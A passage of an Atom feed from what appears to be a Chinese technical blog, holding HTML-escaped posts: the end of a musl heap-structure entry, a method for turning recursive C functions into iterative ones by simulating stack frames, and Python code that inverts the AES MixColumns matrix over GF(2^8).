class="type">uint8_t</span> unmap_seq[<span class="number">32</span>], bounces[<span class="number">32</span>];</span><br><span class="line"><span class="type">uint8_t</span> seq;</span><br><span class="line"></span><br><span class="line"><span class="type">uintptr_t</span> brk;                  <span class="comment">//bss 段结尾.</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>大体的内存布局:</p><p><img src="https://h4ckf0rfun.github.io/2022/10/12/musl1-2-2%E5%A0%86%E7%AE%A1%E7%90%86%E6%9C%BA%E5%88%B6-1/Untitled.svg" alt="Untitled"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;1-basic-data-structure&quot;&gt;&lt;a href=&quot;#1-basic-data-structure&quot; class=&quot;headerlink&quot; title=&quot;1. basic data structure&quot;&gt;&lt;/a&gt;1. basic data struc</summary>
      
    
    
    
    <category term="Pwn" scheme="https://h4ckf0rfun.github.io/categories/Pwn/"/>
    
    
  </entry>
  
  <entry>
    <title>任意递归写法转迭代写法</title>
    <link href="https://h4ckf0rfun.github.io/2022/10/12/%E4%BB%BB%E6%84%8F%E9%80%92%E5%BD%92%E5%86%99%E6%B3%95%E8%BD%AC%E8%BF%AD%E4%BB%A3%E5%86%99%E6%B3%95/"/>
    <id>https://h4ckf0rfun.github.io/2022/10/12/%E4%BB%BB%E6%84%8F%E9%80%92%E5%BD%92%E5%86%99%E6%B3%95%E8%BD%AC%E8%BF%AD%E4%BB%A3%E5%86%99%E6%B3%95/</id>
    <published>2022-10-12T06:10:58.000Z</published>
    <updated>2022-10-12T06:14:42.510Z</updated>
    
    <content type="html"><![CDATA[<h1 id="原理"><a href="#原理" class="headerlink" title="原理:"></a>原理:</h1><p>想到一种通用的解法，直接模拟x86下c语言程序栈结构去执行。</p><p>先看一下x86下c语言函数的栈结构:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">--------</span><br><span class="line"></span><br><span class="line">局部变量</span><br><span class="line"></span><br><span class="line">--------</span><br><span class="line">返回地址</span><br><span class="line">--------</span><br><span class="line">调用者传递的参数</span><br><span class="line">--------</span><br></pre></td></tr></table></figure><p>其中返回值一般保存在eax (如果能保存下来的话)，eip控制下一条指令的地址。我们这里简化一下，用下面的结构体，我将其命名为 Ctx (当前函数的上下文)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Ctx</span>&#123;</span></span><br><span class="line"><span class="type">int</span> args;           <span class="comment">//当前函数的参数</span></span><br><span class="line"><span class="type">int</span> vars;           <span class="comment">//当前函数的局部变量.</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> return_val;     <span class="comment">//保存当前函数调用其他函数时的返回值</span></span><br><span class="line"><span class="type">int</span> pc;             <span class="comment">//控制当前函数下一句执行的代码，相当于给每一个函数一个eip寄存器</span></span><br><span class="line"><span class="comment">//所以我们就不需要保存返回地址了.</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Example1：二叉树的中序遍历"><a href="#Example1：二叉树的中序遍历" class="headerlink" title="Example1：二叉树的中序遍历"></a>Example1：二叉树的中序遍历</h1><h2 id="递归的写法"><a href="#递归的写法" class="headerlink" title="递归的写法:"></a>递归的写法:</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">TreeNode</span> &#123;</span></span><br><span class="line"><span class="type">int</span> val;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">TreeNode</span> *<span class="title">left</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">TreeNode</span> *<span class="title">right</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">travel_by_recursive</span><span class="params">(TreeNode*node)</span>&#123;</span><br><span class="line"><span class="keyword">if</span> (node == <span class="literal">NULL</span>)&#123;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">travel_by_recursive(node-&gt;left);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;val:%d\n&quot;</span>, node-&gt;val);</span><br><span class="line">travel_by_recursive(node-&gt;right);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="迭代的写法"><a href="#迭代的写法" class="headerlink" title="迭代的写法:"></a>迭代的写法:</h2><p>先定义一个ctx:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ctx</span>&#123;</span></span><br><span class="line">TreeNode*node;<span class="comment">//传递给当前函数的参数.</span></span><br><span class="line"><span class="type">int</span> vars;      <span class="comment">//局部变量,当前函数内的，这个例子没有用到</span></span><br><span class="line"><span class="type">int</span> return_val;<span class="comment">//临时变量,保存某个函数调用时的返回值.这个例子没有用到.</span></span><br><span class="line"><span class="type">int</span> pc;    <span class="comment">//控制下一行代码.</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>然后照着上面的递归写法转换:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">travel</span><span class="params">(<span class="keyword">struct</span> TreeNode* root)</span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="built_in">stack</span>&lt;ctx&gt; s;</span><br><span class="line">s.push(&#123; root, <span class="number">0</span>, <span class="number">0</span>,<span class="number">0</span> &#125;);</span><br><span class="line"><span class="keyword">while</span> (!s.empty())&#123;</span><br><span class="line"><span class="comment">//执行当前函数内(ctx)的代码:</span></span><br><span class="line"><span class="keyword">auto</span> &amp; t = s.top();</span><br><span class="line"><span class="keyword">switch</span> (t.pc)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line"><span class="keyword">if</span> (t.node == <span class="literal">NULL</span>)&#123;</span><br><span class="line">s.pop();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">t.pc++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>:<span class="comment">//travel_by_recursive(node-&gt;left);</span></span><br><span class="line">s.push(&#123; t.node-&gt;left, <span class="number">0</span>, <span class="number">0</span> ,<span class="number">0</span>&#125;);<span class="comment">//pc初始化为0.</span></span><br><span class="line">t.pc++;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">2</span>:<span class="comment">//printf(&quot;val:%d\n&quot;, node-&gt;val);</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;val:%d&quot;</span>, t.node-&gt;val);</span><br><span class="line">t.pc++;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">3</span>:<span class="comment">//travel_by_recursive(node-&gt;right);</span></span><br><span class="line">s.push(&#123; t.node-&gt;right, <span class="number">0</span>, <span class="number">0</span> ,<span class="number">0</span>&#125;);</span><br><span class="line">t.pc++;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">s.pop();<span class="comment">//函数返回.</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在迭代的写法中，我们直接用一个switch 来根据pc 执行不同的代码</p><h1 id="Example2-求二分查找数组中的最大值"><a href="#Example2-求二分查找数组中的最大值" class="headerlink" title="Example2: 求二分查找数组中的最大值"></a>Example2: 求二分查找数组中的最大值</h1><h2 id="递归的写法-1"><a href="#递归的写法-1" class="headerlink" title="递归的写法:"></a>递归的写法:</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">get_max_by_recursive</span><span class="params">(<span class="type">int</span>*arr, <span class="type">int</span> left, <span class="type">int</span> right)</span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (left == right || (right - left) == <span class="number">1</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> max(arr[left], arr[right]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> left_m = get_max_by_recursive(arr, left, (left + right) / <span class="number">2</span>);</span><br><span class="line"><span class="type">int</span> right_m = get_max_by_recursive(arr, (left + right) / <span class="number">2</span> + <span class="number">1</span>, right);</span><br><span class="line"><span class="keyword">return</span> max(left_m, right_m);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="非递归的写法"><a href="#非递归的写法" class="headerlink" title="非递归的写法:"></a>非递归的写法:</h2><p>定义一个ctx:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">BSMaxCtx</span>&#123;</span></span><br><span class="line"><span class="comment">//args:</span></span><br><span class="line"><span class="type">int</span>*arr;</span><br><span class="line"><span class="type">int</span> left, right;</span><br><span class="line"><span class="comment">//局部变量</span></span><br><span class="line"><span class="type">int</span> left_m, right_m;</span><br><span class="line"><span class="comment">//临时变量,保存某个函数调用时的返回值.</span></span><br><span class="line"><span class="type">int</span> return_val;</span><br><span class="line"><span class="comment">//控制下一行代码.</span></span><br><span class="line"><span class="type">int</span> pc;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>迭代写法:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">get_max_by_iterate</span><span class="params">(<span class="type">int</span>*arr, <span class="type">int</span> left, <span class="type">int</span> right)</span>&#123;</span><br><span class="line"><span class="type">int</span> max_val = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//二分查找最大值.</span></span><br><span class="line"><span class="built_in">stack</span>&lt;BSMaxCtx&gt;s;</span><br><span class="line"><span class="comment">//第一次调用</span></span><br><span class="line">s.push(&#123; arr, left, right, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span> &#125;);</span><br><span class="line"><span class="keyword">while</span> (!s.empty())&#123;</span><br><span class="line"><span class="keyword">auto</span>&amp; t = s.top();</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> (t.pc)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0</span>:<span class="comment">//判断终止条件</span></span><br><span class="line"><span class="keyword">if</span> (t.left == t.right || (t.left + <span class="number">1</span>) == t.right)&#123;</span><br><span class="line"><span class="type">int</span> tmp = max(t.arr[t.left], t.arr[t.right]);</span><br><span class="line">s.pop();</span><br><span class="line"><span class="comment">//将返回值传给上一次调用.</span></span><br><span class="line"><span class="keyword">if</span> (s.empty())&#123;</span><br><span class="line">max_val = tmp;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">s.top().return_val = tmp;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">t.pc++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line"><span class="comment">//call get_max_by_recursive(arr, left, (left + right) / 2);</span></span><br><span class="line">s.push(&#123; t.arr, t.left, (t.left + t.right) / <span class="number">2</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span> &#125;);</span><br><span class="line">t.pc++;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line"><span class="comment">//left_m = eax;</span></span><br><span class="line">t.left_m = t.return_val;</span><br><span class="line">t.pc++;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line"><span class="comment">//call get_max_by_recursive(arr, (left + right) / 2 + 1, right);</span></span><br><span class="line">s.push(&#123; t.arr, (t.left + t.right) / <span class="number">2</span> + <span class="number">1</span>, t.right, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span> &#125;);</span><br><span class="line">t.pc++;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line"><span class="comment">//right_m = eax;</span></span><br><span class="line">t.right_m = t.return_val;</span><br><span class="line">t.pc++;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line"><span class="comment">//return max(left_m, right_m);</span></span><br><span class="line"><span class="keyword">do</span>&#123;</span><br><span class="line"><span class="type">int</span> tmp = max(t.left_m, t.right_m);</span><br><span class="line">s.pop();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (s.empty())&#123;</span><br><span class="line">max_val = tmp;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">s.top().return_val = tmp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">while</span> (<span class="number">0</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> max_val;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;原理&quot;&gt;&lt;a href=&quot;#原理&quot; class=&quot;headerlink&quot; title=&quot;原理:&quot;&gt;&lt;/a&gt;原理:&lt;/h1&gt;&lt;p&gt;想到一种通用的解法，直接模拟x86下c语言程序栈结构去执行。&lt;/p&gt;
&lt;p&gt;先看一下x86下c语言函数的栈结构:&lt;/p&gt;
&lt;figure</summary>
      
    
    
    
    <category term="algorithm" scheme="https://h4ckf0rfun.github.io/categories/algorithm/"/>
    
    
  </entry>
  
  <entry>
    <title>AES列混合矩阵求逆</title>
    <link href="https://h4ckf0rfun.github.io/2022/10/09/AES%E5%88%97%E6%B7%B7%E5%90%88%E7%9F%A9%E9%98%B5%E6%B1%82%E9%80%86/"/>
    <id>https://h4ckf0rfun.github.io/2022/10/09/AES%E5%88%97%E6%B7%B7%E5%90%88%E7%9F%A9%E9%98%B5%E6%B1%82%E9%80%86/</id>
    <published>2022-10-09T15:32:31.000Z</published>
    <updated>2022-10-09T15:36:43.644Z</updated>
    
    <content type="html"><![CDATA[<h1 id="AES列混合-矩阵求逆"><a href="#AES列混合-矩阵求逆" class="headerlink" title="AES列混合 矩阵求逆"></a>AES列混合 矩阵求逆</h1><p>还是没太明白具体原理，瞎JB搞了下但是算出来了</p><p>GF(2^8) 的多项式，不太明白这个，貌似是 每个系数是 域中的一个元素 (0或者1)</p><p>多项式加法的话对应的系数进行定义在这个域上的加法操作就行，多项式乘法的话，展开相乘就行，最后相加的时候也是按照定义在域上的乘法</p><p>多项式除发:</p><p>写成对应的二进制数，然后按照小学学过的除法规则就能求出余数，(这里面不涉及减法…)</p><p>mod <em>0b100011011：</em></p><p>多项式相乘之后再mod 这个数，目的是将结果限制在 0-255内</p><p>重新定义了加法和乘法，然后按照新的规则就能求出逆矩阵了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">gf28_add</span>(<span class="params">a:<span class="built_in">int</span>,b:<span class="built_in">int</span></span>)-&gt;<span class="built_in">int</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xff</span> &amp; (a ^ b)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gf28_mul</span>(<span class="params">a:<span class="built_in">int</span>,b:<span class="built_in">int</span></span>)-&gt;<span class="built_in">int</span>:</span><br><span class="line">    result = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> b:</span><br><span class="line">        <span class="keyword">if</span> b&amp;<span class="number">1</span>:</span><br><span class="line">            result = a ^ result</span><br><span class="line">        a&lt;&lt;=<span class="number">1</span></span><br><span class="line">        b&gt;&gt;=<span class="number">1</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="comment">#没有大小之说,只要长度相同就能进行运算.(或者说大小就算用长度比较.)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mod_mul</span>(<span class="params">a:<span class="built_in">int</span>, b:<span class="built_in">int</span></span>)-&gt;<span class="built_in">int</span>:</span><br><span class="line">    p = gf28_mul(a,b)</span><br><span class="line">    <span class="comment">##求p mod 0b100011011</span></span><br><span class="line">    result = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        i = <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(<span class="built_in">bin</span>(i * <span class="number">0b100011011</span>)) &gt; <span class="built_in">len</span>(<span class="built_in">bin</span>(p)):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">while</span> <span class="built_in">len</span>(<span class="built_in">bin</span>(i * <span class="number">0b100011011</span>)) &lt; <span class="built_in">len</span>(<span class="built_in">bin</span>(p)):</span><br><span class="line">            i&lt;&lt;=<span class="number">1</span></span><br><span class="line">        <span class="keyword">assert</span>(<span class="built_in">len</span>(<span class="built_in">bin</span>(i * <span class="number">0b100011011</span>)) == <span class="built_in">len</span>(<span class="built_in">bin</span>(p)))</span><br><span class="line">        p^= (i * <span class="number">0b100011011</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> p</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_reverse</span>(<span class="params">a:<span class="built_in">int</span></span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        <span class="keyword">if</span> mod_mul(i,a) == <span class="number">0x1</span>:</span><br><span class="line">            <span class="keyword">return</span> i</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">assert</span>(<span class="literal">False</span>)</span><br><span class="line"><span class="comment">##x 8 + x 4 + x 3 + x + 1</span></span><br><span class="line"><span class="comment">## 0b100011011</span></span><br><span class="line">_<span class="built_in">map</span> = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">matrix_mul</span>(<span class="params">m1,m2,size</span>):</span><br><span class="line">    result = [[<span class="literal">None</span> <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(size)] <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(size)]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(size):</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(size):</span><br><span class="line">            result[y][x] = <span class="number">0</span></span><br><span class="line">            <span class="keyword">for</span> t <span class="keyword">in</span> <span class="built_in">range</span>(size):</span><br><span class="line">                result[y][x] =gf28_add( result[y][x] ,mod_mul(m1[y][t] , m2[t][x]))</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="comment"># 确实是存在逆的 ..但是为什么呢??</span></span><br><span class="line"><span class="comment"># for i in range(1,256):</span></span><br><span class="line"><span class="comment">#     key = get_reverse(i)</span></span><br><span class="line"><span class="comment">#     print(key)</span></span><br><span class="line"><span class="comment">#     if _map.get(key) != None:</span></span><br><span class="line"><span class="comment">#        print(&quot;Error&quot;)</span></span><br><span class="line"><span class="comment">#        exit(0)</span></span><br><span class="line"><span class="comment">#     else:</span></span><br><span class="line"><span class="comment">#         _map[key] = True</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">矩阵:</span></span><br><span class="line"><span class="string">2 3 1 1</span></span><br><span class="line"><span class="string">1 2 3 1</span></span><br><span class="line"><span class="string">1 1 2 3</span></span><br><span class="line"><span class="string">3 1 1 2</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">A = [</span><br><span class="line">    [<span class="number">2</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>],</span><br><span class="line">    [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>],</span><br><span class="line">    [<span class="number">1</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>],</span><br><span class="line">    [<span class="number">3</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>]</span><br><span class="line">]</span><br><span class="line"><span class="comment"># Ax = E,将A 化为行阶梯矩阵</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    <span class="comment">#求出主元的逆.</span></span><br><span class="line">    r = get_reverse(A[i][i])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span> - i):</span><br><span class="line">        <span class="comment"># a x = b,求出x</span></span><br><span class="line">        x = mod_mul(r , A[i + <span class="number">1</span> + j][i])</span><br><span class="line">        <span class="comment">#消去一个元之后新的一行</span></span><br><span class="line">        new_l = A[i + <span class="number">1</span> + j]</span><br><span class="line">        <span class="keyword">for</span> t <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">            new_l[t] = gf28_add(mod_mul(x,A[i][t]),A[i+<span class="number">1</span>+j][t])</span><br><span class="line"></span><br><span class="line"><span class="comment">##回代</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    r = get_reverse(A[<span class="number">3</span> - i][<span class="number">3</span> - i])</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span> - i):</span><br><span class="line">        <span class="comment"># ax = b,求出x = a^-1 * b</span></span><br><span class="line">        x = mod_mul(r,A[<span class="number">3</span> - i - <span class="number">1</span> - j][<span class="number">3</span> - i])</span><br><span class="line">        new_l = A[<span class="number">3</span> - i - <span class="number">1</span> - j]</span><br><span class="line">        <span class="keyword">for</span> t <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">            new_l[t] = gf28_add(mod_mul(x,A[<span class="number">3</span> - i][t]),A[<span class="number">3</span> - i - <span class="number">1</span>-j][t])</span><br><span class="line"></span><br><span class="line"><span class="comment">## 化为1..</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    r = get_reverse(A[i][i])</span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        A[i][t] = mod_mul(r,A[i][t])</span><br><span class="line"></span><br><span class="line"><span class="comment">#################################</span></span><br></pre></td></tr></table></figure><p>瞎JB求出来了，是下面的这个矩阵:</p><p><img src="https://h4ckf0rfun.github.io/2022/10/09/AES%E5%88%97%E6%B7%B7%E5%90%88%E7%9F%A9%E9%98%B5%E6%B1%82%E9%80%86/Untitled.png" 